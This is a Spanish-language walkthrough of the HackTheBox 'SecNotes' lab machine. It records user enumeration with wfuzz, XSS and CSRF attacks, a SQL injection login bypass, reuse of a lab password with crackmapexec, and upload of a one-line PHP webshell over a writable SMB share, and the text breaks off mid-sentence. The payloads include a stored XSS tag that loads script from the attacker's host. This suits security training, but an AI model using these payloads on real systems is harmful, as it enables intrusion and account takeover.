-------
- Tags: #xss #xss-stored #xss-reflected #sqli #CSRF #IIS #information-leakage 
- -------
## Técnicas utilizadas
- User Enumeration (Wfuzz)  
- Reflected XSS  
- Stored XSS  
- SQL Injection  
- Cross-Site Request Forgery (CSRF) - Changing a user's password  
- IIS Exploitation (Uploading WebShell)  
- Abusing Linux subsystem  
- Information Leakage [Privilege Escalation]
## Procedimiento
![[Pasted image 20230804191554.png]]

#### Reconocimiento
Si lanzamos un escaneo con **nmap** podemos ver los siguientes puertos abiertos:
```ruby
 nmap -sCV -p80,445,8808 10.10.10.97 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-07 05:31 UTC
Nmap scan report for 10.10.10.97
Host is up (0.13s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-08-06T22:27:09-07:00
| smb2-time: 
|   date: 2023-08-07T05:27:07
|_  start_date: N/A
|_clock-skew: mean: 2h15m26s, deviation: 4h02m31s, median: -4m34s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.46 seconds
```

Un escaneo sobre el aplicativo web con **whatweb** nos muestra las siguientes tecnologías web corriendo por detrás:
```ruby
 whatweb 10.10.10.97
http://10.10.10.97 [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], PHP[7.2.7], RedirectLocation[login.php], X-Powered-By[PHP/7.2.7]
http://10.10.10.97/login.php [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], PHP[7.2.7], PasswordField[password], Title[Secure Notes - Login], X-Powered-By[PHP/7.2.7]
```

----------
#### User Enumeration (Wfuzz)  
Vemos que la pagina que tiene por defecto un **Login** es vulnerable a enumerarción de usuarios a través de mensajes de error:

Cuando el usuario existe, simplemente muestra un error que nos dice que la contraseña es incorrecta, sin embargo, cuando el usuario es incorrecto, nos sale el error pero ahora con el usuario. Vamos aprovecharnos de esto para enumerar un par de usuarios potenciales con la herramienta **wfuzz**:
```
# wfuzz --hs "No account found with that username." -c -t 80 -w /usr/share/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&password=password' http://10.10.10.10/login.php
```

Con esto, podemos encontra el siguiente usuario valido:
![[Pasted image 20230807053843.png]]

-----------
#### Reflected XSS  
En el apartado de **Login** podemos crear una cuenta. Si creamos una e iniciamos sesión, no redirige a un dashboard:
![[Pasted image 20230807054007.png]]

Dentro del dashboard, nos da la posibilidad de crear notas. La funcion es vulnerable XSS **Reflejado**, ya que si colocamos el tipico `<script>alert("XSS")</script>` vemos que la web nos lo interpreta:
![[Pasted image 20230807054049.png]]

----------
#### Stored XSS  
En el dashboard también veiamos un apartado de **Contacto**, este tambien es vulnerable a XSS, pero esta ves a uno de tipo **Almacenado**, dado que si le mandamos un mensaje con las etiqueta `<script src="http://10.10.10.10/pwned.js"></script>` vemos como nos llega una petición a nuestro servidor:
```
Image Request My Server
```

Tambien podemos percatarnos de que si le ponemos el URL de nuestro servidor alojado en **Python** el usuario visita nuestro enlace:
```
Image Request Trought 
```

Esto es peligroso dado que podemos derivarlo a XSRF/CSRF, es decir, colocar una enlace especialmente diseñado para que al momento de visitarlo cambie la contraseña del usuario.

-----------
#### Cross-Site Request Forgery (CSRF) - Changing a user's password  
Lo primero que tendriamos que verificar es si es posible hacer el cambio de contraseña a través del metodo **GET** dado que por defecto la petición viaja por **POST**. Con burpsuite podriamos interceptar la petición e intentar cambiar el metodo para que sea por **GET** y al tramitarlo vemos que la contraseña se ha modificado exitosamente:
![[Pasted image 20230807055005.png]]

Bien, pues la cadena especialmente diseñada que le mandaremos en el formulario de contacto a **Tyler** tendria el siguiente aspecto:
```
http://10.10.10.97/change_pass.php?password=admin123&confirm_password=admin123&submit=submit
```

Una vez se la mandemos, podemos intentar iniciar sesión como **Tyler** con la contraseña definida y en efecto, vemos que la contraseña se cambio con exito:
![[Pasted image 20230807055050.png]]

------------
#### SQL Injection 
Otra forma forma de haber llegado a la cuenta privilegiada, es a traves de un **SQLi** en la parte de registro:
```
Image or 1=1-- -
```

Si los registramos como este usuario: `admin' or 1=1-- -` e iniciamos sesión, podremos ver lo mismo que ve **Tyler**:
![[Pasted image 20230807055127.png]]

------------
#### IIS Exploitation (Uploading WebShell) 
Dentro del sitio web, podemos encontrar una nota que contiene credenciales:
![[Pasted image 20230807060002.png]]

Con estas credenciales, podemos validar si el usuario es valido a nivel de sistema con **crackmapexec**:
```
# crackmapexec smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&'
SMB         10.10.10.97     445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.10.10.97     445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 
```

Listando el recurso compartido a nivel de red de nombre **new-site** podemos ver dentro de este los tipicos archivos que vinene con un **IIS**, asi que probablemente corresponda al **IIS** que esta corriendo en el puerto **8808**:
```
crackmapexec smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
SMB         10.10.10.97     445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.10.10.97     445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 
SMB         10.10.10.97     445    SECNOTES         [+] Enumerated shares
SMB         10.10.10.97     445    SECNOTES         Share           Permissions     Remark
SMB         10.10.10.97     445    SECNOTES         -----           -----------     ------
SMB         10.10.10.97     445    SECNOTES         ADMIN$                          Remote Admin
SMB         10.10.10.97     445    SECNOTES         C$                              Default share
SMB         10.10.10.97     445    SECNOTES         IPC$                            Remote IPC
SMB         10.10.10.97     445    SECNOTES         new-site        READ,WRITE      
```

También nos podemos dar cuenta de que contamos con permisos de escritura, podemos aprovecharnos de esto para subir una **webshell** escrita en **PHP**, dado que cuando lanzamos el **whatweb** vimos que la web intepreta **PHP**. Vamos a subir la tipica **webshell**:
```php
<?php system($_REQUEST['cmd']); ?>
```

Nos conectamos con la herramienta **SMBClient** y ejecutamos el siguiente comando:
```
# smbclient //10.10.10.10/new-site -U 'user%password'
smb: \> put rev.php
```

Ahora podemos visitar este archivo desde el **IIS** y ejecutar comandos:
![[Pasted image 20230807061123.png]]

----------------
#### Abusing Linux subsystem  
Dentro de nuestro directorio de usuario, encontramos un **Symbolic Link**. Si le hacemos un `type` vemos que se esta ejecutando un **bash.exe** desde `C:\Windows\System32`, si lo ejecutamos podemos ver que nos introduce a un **Subsistema** de linux en el cual somos root.

#### Information Leakage [Privilege Escalation]
Si listamos el contenido del **.bash_history** podemos ver credenciales del usuario **Administrator**:
![[Pasted image 20230807061158.png]]
Si la validamos en **crackmapexec** encontramos que nos aparece un **Pwned!** asi que podemos conectarnos con 